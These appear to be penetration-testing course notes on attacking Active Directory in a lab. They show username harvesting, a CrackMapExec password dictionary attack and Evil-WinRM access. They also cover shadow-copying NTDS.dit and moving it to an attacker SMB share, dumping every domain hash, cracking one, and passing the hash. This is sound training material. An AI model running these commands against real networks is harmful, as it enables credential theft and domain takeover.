* `Active Directory` (`AD`)
* A common and critical directory service in modern enterprise networks
* AD is something we will repeatedly encounter, so we need to be familiar with various methods we can use to attack & defend these AD environments
* If an organization uses windows, then AD is used to manage those Windows systems
* It is highly likely that we will need to have a foothold established on the internal network to which the target is connected, because it must be reachable over the network
* There are situations where an organization may be using port forwarding to forward the remote desktop protocol (`3389`) or other protocols used for remote access on their [edge router](https://www.cisco.com/c/en/us/products/routers/what-is-an-edge-router.html) to a system on their internal network
* Let's consider the authentication process once a Windows system has been joined to the domain

![](ADauthentication_diagram.png)

* Once a Windows system is joined to a domain, it will `no longer default to referencing the SAM database to validate logon requests`
* That domain-joined system will now send all authentication requests to be validated by the domain controller before allowing a user to log on
* This does not mean the SAM database can no longer be used
* Someone looking to log on using a local account in the SAM database can still do so by specifying the `hostname` of the device proceeded by the `Username` (Example: `WS01/nameofuser`) or with direct access to the device then typing `./` at the logon UI in the `Username` field
* This is worthy of consideration because we need to be mindful of what system components are impacted by the attacks we perform
* Can also give us additional avenues of attack to consider when targeting Windows desktop operating systems or Windows server operating systems with direct physical access or over a network
* We can also study NTDS attacks by keeping track of this [technique](https://attack.mitre.org/techniques/T1003/003/)

## Dictionary Attacks against AD accounts using CrackMapExec
* It can be rather `noisy` (easy to detect) to conduct these attacks over a network because they can generate a lot of network traffic and alerts on the target system as well as eventually get denied due to login attempt restrictions that may be applied through the use of [Group Policy](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh831791(v=ws.11))
* When we find ourselves in a scenario where a dictionary attack is a viable next step, we can benefit from trying to `custom tailor` our attack as much as possible
* We can consider the organization we are working with to perform the engagement against and use searches on various social media websites and look for an employee directory on the company's website
	* Gaining the names of employees that work at the organization
* One of the first things a new employee will get is a username
	* Naming convention

![](Screenshot_2022-11-12_021631.png)

* Email address's structure will give us the employee's username (structure: username@domain)
	* `jdoe@inlanefreight.com`, we see that `jdoe` is the username

**Tipp**: We can often find the email structure by Googling the domain name, i.e., "@inlanefreight.com" and get some valid emails. From there, we can use a script to scrape various social media sites and mashup potential valid usernames. Some organizations try to obfuscate their usernames to prevent spraying, so they may alias their username like a907 (or something similar) back to joe.smith. That way, email messages can get through, but the actual internal username isn’t disclosed, making password spraying harder. Sometimes you can use google dorks to search for “inlanefreight.com filetype:pdf” and find some valid usernames in the PDF properties if they were generated using a graphics editor. From there, you may be able to discern the username structure and potentially write a small script to create many possible combinations and then spray to see if any come back valid.

#### Creating a Custom list of Usernames
- Ben Williamson
- Bob Burgerstien
- Jim Stevenson
- Jill Johnson
- Jane Doe
* Create a initial list

```sh
bwilliamson
benwilliamson
ben.willamson
willamson.ben
bburgerstien
bobburgerstien
bob.burgerstien
burgerstien.bob
jstevenson
jimstevenson
jim.stevenson
stevenson.ji
```

* Use an `automated list generator` such as the Ruby-based tool  [Username Anarchy](https://github.com/urbanadventurer/username-anarchy) to convert a list of real names into common username formats

```sh
./username-anarchy -i /home/ltnbob/names.txt 

ben
benwilliamson
ben.williamson
benwilli
benwill
benw
b.williamson
bwilliamson
wben
w.ben
williamsonb
williamson
williamson.b
<SNIP>
```

#### Launching the Attack with CrackMapExec

```sh
crackmapexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt

SMB         10.129.201.57     445    DC01           [*] Windows 10.0 Build 17763 x64 (name:DC-PAC) (domain:dac.local) (signing:True) (SMBv1:False)
SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:winter2017 STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:winter2016 STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:winter2015 STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:winter2014 STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:winter2013 STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:P@55w0rd STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:P@ssw0rd! STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             [+] inlanefrieght.local\bwilliamson:P@55w0rd! 
```

* CrackMapExec is using SMB to attempt to logon as user (`-u`) `bwilliamson` using a password (`-p`) list containing a list of commonly used passwords (`/usr/share/wordlists/fasttrack.txt`)
* If the admins configured an account lockout policy, this attack could lock out the account that we are targeting
* An account lockout policy (2022) is not enforced by default with the default group policies that apply to a Windows domain, meaning it is possible that we will come across environments vulnerable to this exact attack we are practicing

#### Event Logs from the Attack

![](events_dc.png)

* Once we have discovered some credentials, we could proceed to try to gain remote access to the target domain controller and capture the NTDS.dit file

## Capturing NTDS.dit
* `NT Directory Services` (`NTDS`)
* Directory service used with AD to find & organize network resources
* Recall that `NTDS.dit` file is stored at `%systemroot$/ntds` on the domain controllers in a forest
* The `.dit` stands for [directory information tree](https://docs.oracle.com/cd/E19901-01/817-7607/dit.html)
* This is the primary database file associated with AD and stores all domain usernames, password hashes, and other critical schema information
* If this file can be captured, we could potentially compromise every account on the domain similar to the technique `Attacking SAM`

#### Connecting to a DC with Evil-WinRM
* Connects to a target using the Windows Remote Management service combined with the PowerShell Remoting Protocol to establish a PowerShell session with the target

```sh
evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'
```

#### Checking Local Group Membership
* Check to see what privileges `bwilliamson` has

```sh
*Evil-WinRM* PS C:\> net localgroup

Aliases for \\DC01

-------------------------------------------------------------------------------
*Access Control Assistance Operators
*Account Operators
*Administrators
*Allowed RODC Password Replication Group
*Backup Operators
*Cert Publishers
*Certificate Service DCOM Access
*Cryptographic Operators
*Denied RODC Password Replication Group
*Distributed COM Users
*DnsAdmins
*Event Log Readers
*Guests
*Hyper-V Administrators
*IIS_IUSRS
*Incoming Forest Trust Builders
*Network Configuration Operators
*Performance Log Users
*Performance Monitor Users
*Pre-Windows 2000 Compatible Access
*Print Operators
*RAS and IAS Servers
*RDS Endpoint Servers
*RDS Management Servers
*RDS Remote Access Servers
*Remote Desktop Users
*Remote Management Users
*Replicator
*Server Operators
*Storage Replica Administrators
*Terminal Server License Servers
*Users
*Windows Authorization Access Group
The command completed successfully.
```

* We are looking to see if the account has local admin rights
* To make a copy of the NTDS.dit file, we need local admin (`Administrators group`) or Domain Admin (`Domain Admins group`) (or equivalent) rights
* We also will want to check what domain privileges we have

#### Checking User Account Privileges including Domain

```sh
*Evil-WinRM* PS C:\> net user bwilliamson

User name                    bwilliamson
Full Name                    Ben Williamson
Comment
Users comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/13/2022 12:48:58 PM
Password expires             Never
Password changeable          1/14/2022 12:48:58 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   1/14/2022 2:07:49 PM

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users         *Domain Admins
The command completed successfully.
```

* This account has both Administrators and Domain Administrator rights which means we can do just about anything we want, including making a copy of the NTDS.dit file

#### Creating Shadow Copy of C:
* We can use `vssadmin` to create a [Volume Shadow Copy](https://docs.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service) (`VSS`) of the C: drive or whatever volume the admin chose when initially installing AD
* Very likely that NTDS will be stored on C: as that is the default location selected at install, but it is possible to change the location
* Use VSS for this because it is designed to make copies of volumes that may be read & written to actively without needing to bring a particular application or system down

```sh
*Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:

vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.

Successfully created shadow copy for 'C:\'
    Shadow Copy ID: {186d5979-2f2b-4afe-8101-9f1111e4cb1a}
    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
```

#### Copying NTDS.dit from the VSS
* We can then copy the NTDS.dit file from the volume shadow copy of C: onto another location on the drive to prepare to move NTDS.dit to our attack host

```sh
*Evil-WinRM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit

        1 file(s) copied.
```

```sh
*Evil-WinRM* PS C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData 

        1 file(s) moved.		
```

#### A Faster Method: Using cme to Capture NTDS.dit

```sh
crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds

SMB         10.129.201.57    445     DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefrieght.local) (signing:True) (SMBv1:False)
SMB         10.129.201.57    445     DC01             [+] inlanefrieght.local\bwilliamson:P@55w0rd! (Pwn3d!)
SMB         10.129.201.57    445     DC01             [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         10.129.201.57    445     DC01           Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
SMB         10.129.201.57    445     DC01           Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.201.57    445     DC01           DC01$:1000:aad3b435b51404eeaad3b435b51404ee:e6be3fd362edbaa873f50e384a02ee68:::
SMB         10.129.201.57    445     DC01           krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cbb8a44ba74b5778a06c2d08b4ced802:::
SMB         10.129.201.57    445     DC01           inlanefrieght.local\jim:1104:aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2ec06a62cb887fb391dee0:::
SMB         10.129.201.57    445     DC01           WIN-IAUBULPG5MZ:1105:aad3b435b51404eeaad3b435b51404ee:4f3c625b54aa03e471691f124d5bf1cd:::
SMB         10.129.201.57    445     DC01           WIN-NKHHJGP3SMT:1106:aad3b435b51404eeaad3b435b51404ee:a74cc84578c16a6f81ec90765d5eb95f:::
SMB         10.129.201.57    445     DC01           WIN-K5E9CWYEG7Z:1107:aad3b435b51404eeaad3b435b51404ee:ec209bfad5c41f919994a45ed10e0f5c:::
SMB         10.129.201.57    445     DC01           WIN-5MG4NRVHF2W:1108:aad3b435b51404eeaad3b435b51404ee:7ede00664356820f2fc9bf10f4d62400:::
SMB         10.129.201.57    445     DC01           WIN-UISCTR0XLKW:1109:aad3b435b51404eeaad3b435b51404ee:cad1b8b25578ee07a7afaf5647e558ee:::
SMB         10.129.201.57    445     DC01           WIN-ETN7BWMPGXD:1110:aad3b435b51404eeaad3b435b51404ee:edec0ceb606cf2e35ce4f56039e9d8e7:::
SMB         10.129.201.57    445     DC01           inlanefrieght.local\bwilliamson:1125:aad3b435b51404eeaad3b435b51404ee:bc23a1506bd3c8d3a533680c516bab27:::
SMB         10.129.201.57    445     DC01           inlanefrieght.local\bburgerstien:1126:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
SMB         10.129.201.57    445     DC01           inlanefrieght.local\jstevenson:1131:aad3b435b51404eeaad3b435b51404ee:bc007082d32777855e253fd4defe70ee:::
SMB         10.129.201.57    445     DC01           inlanefrieght.local\jjohnson:1133:aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24:::
SMB         10.129.201.57    445     DC01           inlanefrieght.local\jdoe:1134:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
SMB         10.129.201.57    445     DC01           Administrator:aes256-cts-hmac-sha1-96:cc01f5150bb4a7dda80f30fbe0ac00bed09a413243c05d6934bbddf1302bc552
SMB         10.129.201.57    445     DC01           Administrator:aes128-cts-hmac-sha1-96:bd99b6a46a85118cf2a0df1c4f5106fb
SMB         10.129.201.57    445     DC01           Administrator:des-cbc-md5:618c1c5ef780cde3
SMB         10.129.201.57    445     DC01           DC01$:aes256-cts-hmac-sha1-96:113ffdc64531d054a37df36a07ad7c533723247c4dbe84322341adbd71fe93a9
SMB         10.129.201.57    445     DC01           DC01$:aes128-cts-hmac-sha1-96:ea10ef59d9ec03a4162605d7306cc78d
SMB         10.129.201.57    445     DC01           DC01$:des-cbc-md5:a2852362e50eae92
SMB         10.129.201.57    445     DC01           krbtgt:aes256-cts-hmac-sha1-96:1eb8d5a94ae5ce2f2d179b9bfe6a78a321d4d0c6ecca8efcac4f4e8932cc78e9
SMB         10.129.201.57    445     DC01           krbtgt:aes128-cts-hmac-sha1-96:1fe3f211d383564574609eda482b1fa9
SMB         10.129.201.57    445     DC01           krbtgt:des-cbc-md5:9bd5017fdcea8fae
SMB         10.129.201.57    445     DC01           inlanefrieght.local\jim:aes256-cts-hmac-sha1-96:4b0618f08b2ff49f07487cf9899f2f7519db9676353052a61c2e8b1dfde6b213
SMB         10.129.201.57    445     DC01           inlanefrieght.local\jim:aes128-cts-hmac-sha1-96:d2377357d473a5309505bfa994158263
SMB         10.129.201.57    445     DC01           inlanefrieght.local\jim:des-cbc-md5:79ab08755b32dfb6
SMB         10.129.201.57    445     DC01           WIN-IAUBULPG5MZ:aes256-cts-hmac-sha1-96:881e693019c35017930f7727cad19c00dd5e0cfbc33fd6ae73f45c117caca46d
SMB         10.129.201.57    445     DC01           WIN-IAUBULPG5MZ:aes128-cts-hmac-sha1-
     [+] Dumped 61 NTDS hashes to /home/bob/.cme/logs/DC01_10.10.15.30_2022-01-19_133529.ntds of which 15 were added to the database
```

## Cracking Hashes & Gaining Credentials

```sh
sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt

64f12cddaa88057e06a81b54e73b949b:Password1
```

## Pass-the-Hash Considerations
* When we are unsuccessful in cracking a hash
* `Pass-the-Hash` (`PtH`)
* PtH attack takes advantage of the [NTLM authentication protocol](https://docs.microsoft.com/en-us/windows/win32/secauthn/microsoft-ntlm#:~:text=NTLM%20uses%20an%20encrypted%20challenge,to%20the%20secured%20NTLM%20credentials) to authenticate a user using a password hash
* Instead of `username`:`clear-text password` as the format for login, we can instead use `username`:`password hash`
* We can attempt to use this attack when needing to move laterally across a network after the initial compromise of a target

```sh
evil-winrm -i 10.129.201.57  -u  Administrator -H "64f12cddaa88057e06a81b54e73b949b"
```